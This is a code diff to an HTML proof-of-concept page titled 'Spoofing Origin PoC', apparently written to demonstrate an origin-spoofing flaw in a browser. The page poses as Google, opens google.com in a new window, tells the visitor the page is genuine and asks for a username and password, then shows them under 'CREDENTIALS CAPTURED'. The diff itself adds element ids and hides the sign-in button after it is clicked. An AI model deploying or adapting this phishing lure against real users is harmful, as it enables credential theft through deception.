@@ -2,7 +2,7 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
     <title>Spoofing Origin PoC</title>
     <style>
       body {
@@ -49,19 +49,10 @@
   <body>
     <div class="box">
       <h1>Google</h1>
-      <p>Click the button below to continue.</p>
-      <button onclick="runPoC()">Sign in to Google</button>
+      <p id="intro">Click the button below to continue.</p>
+      <button id="triggerBtn" onclick="runPoC()">Sign in to Google</button>
 
-      <div
-        class="fake-panel"
-        id="panel"
-        style="
-          display: none;
-          margin-top: 24px;
-          padding: 20px;
-          border: 1px solid #ccc;
-        "
-      >
+      <div class="fake-panel" id="panel">
         <h3>
           This page is a google.com page, you can see it yourself above, please
           fill in your username and password below.
@@ -106,10 +97,10 @@
 
         if (username && password) {
           document.getElementById("result").innerHTML = `
-            <strong style="color:green;">CREDENTIALS CAPTURED</strong><br>
-            Username: ${username}<br>
-            Password: ${password}
-          `;
+<strong style="color:green;">CREDENTIALS CAPTURED</strong><br>
+Username: ${username}<br>
+Password: ${password}
+`;
           document.getElementById("username").value = "";
           document.getElementById("password").value = "";
         } else {
@@ -121,6 +112,10 @@
       function runPoC() {
         const w = window.open("https://www.google.com/csi", "_blank");
         document.getElementById("panel").style.display = "block";
+
+        // REMOVE button dan intro text setelah diklik
+        document.getElementById("triggerBtn").style.display = "none";
+        document.getElementById("intro").style.display = "none";
       }
     </script>
   </body>
